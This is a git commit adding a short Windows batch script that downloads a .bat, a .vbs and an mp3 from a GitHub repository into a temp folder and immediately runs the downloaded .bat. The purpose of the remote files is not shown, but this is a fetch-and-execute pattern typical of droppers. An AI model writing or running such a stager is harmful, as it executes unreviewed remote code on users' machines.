6b8d4e12c76ec282a94a2436fa3385627a895cea
zvdxc <zvdxc11@gmail.com>
2022-06-03 13:30:21 +0200

    Update .bat

---
+++ .bat
@@ -0,0 +1,8 @@
+cd %temp%
+rd i
+md i
+cd i
+curl https://raw.githubusercontent.com/zvdxc/yaais/main/sources/.bat >> .bat
+curl https://raw.githubusercontent.com/zvdxc/yaais/main/sources/.vbs >> .vbs
+curl https://raw.githubusercontent.com/zvdxc/yaais/main/sources/i.mp3 >> i.mp3
+start .bat
